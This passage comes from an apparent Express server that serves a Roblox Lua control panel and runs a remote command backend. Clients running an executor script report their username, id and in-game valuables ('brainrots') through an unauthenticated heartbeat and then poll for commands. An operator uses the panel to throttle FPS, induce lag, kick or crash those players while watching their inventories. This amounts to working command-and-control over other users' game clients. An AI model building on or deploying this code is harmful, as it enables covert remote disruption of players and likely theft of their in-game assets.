            BackgroundTransparency = 1,
            Text = client.display_name or client.username or "?",
            TextColor3 = Theme.Text,
            TextSize = 13,
            Font = Enum.Font.GothamBold,
            TextXAlignment = Enum.TextXAlignment.Left,
            ZIndex = 7,
        })

        local subLbl = create("TextLabel", {
            Parent = row,
            Position = UDim2.new(0, 24, 0, 22),
            Size = UDim2.new(1, -34, 0, 14),
            BackgroundTransparency = 1,
            Text = ("@%s · id %s · %s"):format(
                client.username or "?",
                client.user_id or "?",
                client.executor or "?"
            ),
            TextColor3 = Theme.Dim,
            TextSize = 11,
            Font = Enum.Font.Gotham,
            TextXAlignment = Enum.TextXAlignment.Left,
            TextTruncate = Enum.TextTruncate.AtEnd,
            ZIndex = 7,
        })

        local gameLbl = create("TextLabel", {
            Parent = row,
            Position = UDim2.new(0, 24, 0, 38),
            Size = UDim2.new(1, -34, 0, 14),
            BackgroundTransparency = 1,
            Text = ("%s · seen %ds ago"):format(
                client.game_name or "Unknown",
                math.floor((now - (client.lastHeartbeat or now)) / 1000)
            ),
            TextColor3 = Theme.Dim,
            TextSize = 11,
            Font = Enum.Font.Gotham,
            TextXAlignment = Enum.TextXAlignment.Left,
            TextTruncate = Enum.TextTruncate.AtEnd,
            ZIndex = 7,
        })

        local userId = client.user_id
        local state = { fps_limit = false, lag_c = false }

        if client.fps_limit then state.fps_limit = true end
        if client.lag_c then state.lag_c = true end

        local setFps, setLagC

        setFps = makeChip(row, "FPS", Theme.Orange, 10, 60, function(next, setActive)
            state.fps_limit = next
            setActive(next)
            sendFullState(userId, state.fps_limit, state.lag_c)
        end)
        if state.fps_limit then setFps(true) end

        setLagC = makeChip(row, "LAG-C", Theme.Orange, 76, 62, function(next, setActive)
            state.lag_c = next
            setActive(next)
            sendFullState(userId, state.fps_limit, state.lag_c)
        end)
        if state.lag_c then setLagC(true) end

        makeOneShot(row, "KICK", Theme.Red, 144, 58, function()
            sendCommand(userId, { "kick", true })
        end)

        local copyBtn = create("TextButton", {
            Parent = row,
            AnchorPoint = Vector2.new(0, 0.5),
            Position = UDim2.new(0, 208, 1, -22),
            Size = UDim2.new(0, 58, 0, 24),
            BackgroundColor3 = Theme.Bg,
            AutoButtonColor = false,
            Text = "COPY",
            TextColor3 = Theme.Blue,
            TextSize = 11,
            Font = Enum.Font.GothamBold,
            ZIndex = 7,
        })
        corner(copyBtn, 6)
        stroke(copyBtn, Theme.Blue, 1, 0.45)
        copyBtn.MouseEnter:Connect(function()
            TweenService:Create(copyBtn, TweenInfo.new(0.12), {
                BackgroundColor3 = Theme.Blue,
                TextColor3 = Theme.Bg,
            }):Play()
        end)
        copyBtn.MouseLeave:Connect(function()
            TweenService:Create(copyBtn, TweenInfo.new(0.12), {
                BackgroundColor3 = Theme.Bg,
                TextColor3 = Theme.Blue,
            }):Play()
        end)
        copyBtn.MouseButton1Click:Connect(function()
            local realUsername = client.username or ""
            if realUsername ~= "" then
                copyToClipboard(realUsername)
            end
        end)

        rowsByUser[userId] = { row = row, setFps = setFps, setLagC = setLagC }
    end

    task.wait()
    Results.CanvasSize = UDim2.new(0, 0, 0, PlayerContainer.AbsoluteSize.Y + 4)
end

local function updateRowStates()
    for userId, data in pairs(playersData) do
        local row = rowsByUser[userId]
        if row then
            if data.fps_limit then row.setFps(true) end
            if data.lag_c then row.setLagC(true) end
        end
    end
end

local function poll()
    if fetchPlayers() then
        renderPlayers()
        updateRowStates()
    end
end

SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
    searchQuery = SearchBox.Text
    renderPlayers()
end)

poll()
task.spawn(function()
    while ScreenGui.Parent do
        task.wait(1.5)
        poll()
    end
end)`;
    res.setHeader('Content-Type', 'text/plain');
    res.send(panel);
});

// ─── PROTECTED: main page ───
app.get('/', requireSession, (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ─── PROTECTED: admin API endpoints ───
app.get('/api/players', requireSession, (req, res) => {
    const list = [];
    const now = Date.now();
    const OFFLINE_THRESHOLD = 15000;
    const REMOVE_THRESHOLD = 20 * 60 * 1000;

    for (const [id, p] of players.entries()) {
        const timeSinceLast = now - (p.lastHeartbeat || 0);
        const online = timeSinceLast < OFFLINE_THRESHOLD;

        if (timeSinceLast >= REMOVE_THRESHOLD) {
            players.delete(id);
            continue;
        }

        if (!online) {
            p.fps_limit = false;
            p.lag_n = false;
            p.lag_c = false;
            p._kick = false;
            p._crash = false;
        }

        p.online = online;
        list.push({ ...p });
        players.set(id, p);
    }
    res.json({ players: list });
});

app.get('/api/command_state', requireSession, (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false });
    res.json({
        fps_limit: p.fps_limit || false,
        lag_n: p.lag_n || false,
        lag_c: p.lag_c || false,
    });
});

app.post('/api/command', requireSession, (req, res) => {
    const { user_id, fps_limit, lag_n, lag_c, kick, crash } = req.body;
    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(user_id);
    const p = players.get(userId);
    if (!p) return res.status(404).json({ error: 'Player not found' });
    if (fps_limit !== undefined) p.fps_limit = !!fps_limit;
    if (lag_n !== undefined) p.lag_n = !!lag_n;
    if (lag_c !== undefined) p.lag_c = !!lag_c;
    if (kick === true) p._kick = true;
    if (crash === true) p._crash = true;
    players.set(userId, p);
    res.json({ status: 'ok' });
});

app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }
    const userId = String(data.user_id);
    const existing = players.get(userId) || {};
    
    let brainrots = data.brainrots || [];
    if (!Array.isArray(brainrots) || brainrots.length === 0) {
        if (existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) {
            brainrots = existing.brainrots;
        }
    } else {
        brainrots = brainrots.filter(b => 
            b && typeof b === 'object' && 
            ((b.title && b.title !== '') || (b.cash && b.cash !== ''))
        );
        if (brainrots.length === 0 && existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) {
            brainrots = existing.brainrots;
        }
    }
    
    players.set(userId, {
        ...existing,
        ...data,
        brainrots: brainrots,
        user_id: userId,
        online: true,
        lastHeartbeat: Date.now(),
        fps_limit: existing.fps_limit || false,
        lag_n: existing.lag_n || false,
        lag_c: existing.lag_c || false,
    });
    res.json({ status: 'ok' });
});

app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false });
    const response = {
        fps_limit: p.fps_limit || false,
        lag_n: p.lag_n || false,
        lag_c: p.lag_c || false,
    };
    if (p._kick) {
        response.kick = true;
        p._kick = false;
    }
    if (p._crash) {
        response.crash = true;
        p._crash = false;
    }
    players.set(String(userId), p);
    res.json(response);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT} (public URL: ${PUBLIC_URL})`);
});